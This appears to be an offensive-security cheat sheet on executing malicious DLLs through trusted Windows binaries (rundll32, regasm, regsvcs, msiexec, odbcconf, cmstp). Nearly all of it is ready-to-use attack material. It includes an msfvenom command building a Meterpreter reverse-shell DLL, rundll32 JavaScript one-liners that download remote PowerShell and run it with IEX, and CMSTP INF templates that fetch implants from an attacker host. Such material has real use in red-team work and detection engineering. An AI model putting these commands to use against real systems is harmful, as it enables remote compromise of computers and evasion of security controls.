# DLL Execution

Search Tag(s): #T1085 #T1191

Generate a DLL implant.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o implant.dll
```

## Rundll32

```
C:\> rundll32.exe implant.dll,StartW
```

Execute a JavaScript that runs a PowerShell script that is downloaded from a remote web site.

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/implant.ps1')");
```

Execute a JavaScript that runs calc.exe and then kills the Rundll32.exe process that was started.

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe", 0, true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

Execute a scriptlet implant from a web server.

```
C:\> rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http[s]://<IP>[:PORT]/implant.sct")"
```

## Regasm

Loads the target .DLL file and executes the RegisterClass function.

```
C:\> regasm.exe AllTheThingsx64.dll
```

Loads the target .DLL file and executes the UnRegisterClass function.

```
regasm.exe /U AllTheThingsx64.dll
```

## Regsvcs

```
C:\> regsvcs.exe AllTheThingsx64.dll
```

## Msiexec

Execute the DLL implant  (calls `DLLRegisterServer`).

```
C:\> msiexec /y "C:\path\to\implant.dll"
```

Unregisters the target DLL.

```
C:\> msiexec /z "C:\path\to\implant.dll"
```

## odbcconf

```
C:\> odbcconf /a {REGSVR C:\path\to\implant.dll}
```

## CMSTP

Fileless scriptlet implant template

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/implant.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Yay"
ShortSvcName="Yay"
```

DLL dropper implant template.

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection

[RegisterOCXSection]
C:\path\to\implant.dll
\\<IP>\implant.dll

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Pentestlab"
ShortSvcName="Pentestlab"
```

Execute implant.

```
C:\> cmstp.exe /ni /s implant.inf
```

Execute fileless implant.

```
C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
```

---
## References

- [LOLBAS: Rundll32](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/)

- [LOLBAS: Regasm](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)

- [LOLBAS: Regsvcs](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)

- [LOLBAS: Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)

- [LOLBAS: Odbcconf](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)

- [Red Team Notes: CMSTP](https://www.ired.team/offensive-security/code-execution/t1191-cmstp-code-execution)

https://lolbas-project.github.io/lolbas/Libraries/Advpack/

https://lolbas-project.github.io/lolbas/Libraries/Setupapi/

https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/

https://lolbas-project.github.io/lolbas/Binaries/Certoc